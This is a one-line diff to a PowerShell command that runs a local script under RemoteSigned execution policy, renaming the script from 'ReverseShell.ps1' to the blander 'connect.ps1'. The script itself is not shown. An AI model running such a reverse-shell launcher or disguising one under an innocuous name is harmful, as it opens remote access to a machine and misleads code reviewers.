@@ -1,1 +1,1 @@
-Powershell.exe -executionpolicy remotesigned -File ReverseShell.ps1
+Powershell.exe -executionpolicy remotesigned -File connect.ps1
